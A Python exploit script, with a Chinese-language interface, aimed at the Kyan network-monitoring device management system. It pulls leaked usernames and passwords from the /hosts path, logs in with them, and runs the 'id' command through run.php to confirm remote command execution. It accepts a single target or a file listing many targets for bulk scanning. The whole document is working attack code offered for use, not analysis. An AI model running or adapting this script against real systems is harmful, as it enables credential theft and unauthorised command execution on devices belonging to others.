#!/usr/bin/env python
# -*- conding:utf-8 -*-

import argparse
import requests
import sys
import urllib3
urllib3.disable_warnings()
import re
from bs4 import BeautifulSoup

def title():
        print("""
                               Kyan网络监控 run.php 远程命令执行
                              use: python3  KyanrunphpRCE.py
                                     Author: Henry4E36
        """)

class information(object):
    def __init__(self,args):
        self.args = args
        self.url = args.url
        self.file = args.file


    def target_url(self):
        target_url = self.url + "/hosts"
        login_url = self.url + "/login.php"
        rce_url = self.url + "/run.php"
        headers = {
            "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:87.0) Gecko/20100101 Firefox/87.0",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        try:
            res = requests.get(url=target_url, headers=headers, verify=False, timeout=5)
            if "UserName" in res.text and res.status_code == 200:
                print(f"\033[31m[{chr(8730)}]  目标系统: {self.url} 存在敏感信息泄漏！")
                print(f"[-]  账号密码为: \n{res.text}")
                pattern1 = re.compile(r"UserName=(.*)")
                pattern2 = re.compile(r"Password=(.*)")
                Username = pattern1.findall(res.text)[0]
                Password = pattern2.findall(res.text)[0]
                try:
                    data = f"""user={Username}&passwd={Password}"""
                    s = requests.Session()  # cookie持久化
                    res1 = s.post(url=login_url,headers=headers,data=data,verify=False,timeout=5)
                    if res1.status_code == 200 and "设备管理系统" in res1.text:
                        try:
                            res2 = s.get(url=rce_url,headers=headers,verify=False,timeout=5)
                            if res2.status_code == 200 and "Shell Execute" in res2.text:
                                try:
                                    command = """command=id"""
                                    res3 = s.post(url=rce_url,headers=headers,data=command,verify=False,timeout=5)
                                    if res3.status_code == 200 and "uid" in res3.text:
                                        soup = BeautifulSoup(res3.text,"lxml")
                                        result = soup.find_all("textarea",attrs={"name": "textarea"})[0].string.strip()
                                        print(f"\033[31m[{chr(8730)}]  目标系统: {self.url} 存在远程命令执行！")
                                        print(f"\033[31m[{chr(8730)}]  执行\"id\"结果为:{result}\033[0m")
                                        print("[-------------------------------------------------------------------]")
                                    else:
                                        print(f"[\033[31mx]\033[0m  目标系统: {self.url} 不存在远程命令执行!")
                                except Exception as e:
                                    print(f"[\033[31mx]\033[0m  目标系统: {self.url} 尝试命令执行错误！")
                            else:
                                print(f"[\033[31mx]\033[0m  目标系统: {self.url} 尝试访问run.php失败!")
                        except Exception as e:
                            print(f"[\033[31mx]\033[0m  目标系统: {self.url} 尝试访问run.php错误!")
                    else:
                        print(f"[\033[31mx]\033[0m  目标系统: {self.url} 尝试登录失败!")
                except Exception as e:
                    print(f"[\033[31mx\033[0m]  目标系统: {self.url} 尝试登录错误!")



            else:
                print(f"[\033[31mx\033[0m]  目标系统: {self.url} 不存在敏感信息泄漏！")
        except Exception as e:
            print("[\033[31mx\033[0m]  站点连接错误！")

    def file_url(self):
        with open(self.file, "r") as urls:
            for url in urls:
                url = url.strip()
                if url[:4] != "http":
                    url = "http://" + url
                self.url = url.strip()
                information.target_url(self)


if __name__ == "__main__":
    title()
    parser = argparse.ArgumentParser(description="Kyan网络监控 run.php 远程命令执行")
    parser.add_argument("-u", "--url", type=str, metavar="url", help="Target url eg:\"http://127.0.0.1\"")
    parser.add_argument("-f", "--file", metavar="file", help="Targets in file  eg:\"ip.txt\"")
    args = parser.parse_args()
    if len(sys.argv) != 3:
        print("[-]  参数错误！\neg1:>>>python3 KyanrunphpRCE.py -u http://127.0.0.1\neg2:>>>python3 KyanrunphpRCE.py -f ip.txt")
    elif args.url:
        information(args).target_url()
    elif args.file:
        information(args).file_url()


